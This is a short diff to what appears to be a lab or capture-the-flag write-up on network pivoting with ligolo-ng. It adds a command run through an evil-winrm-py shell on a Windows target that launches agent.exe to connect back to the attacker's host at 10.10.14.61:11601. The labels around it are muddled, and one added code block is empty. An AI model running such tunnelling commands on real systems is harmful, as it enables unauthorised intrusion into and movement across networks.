@@ -592,6 +592,16 @@ INFO[0001] Listening on 0.0.0.0:11601
 ligolo-ng »
 ```
 
-Ill tb
+Ill then start the proxy on my machine
+
+```python
+evil-winrm-py PS C:\Temp> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
+```
+
+Then on the target ill send the connection back to me
+
+```python
+
+```
 
 
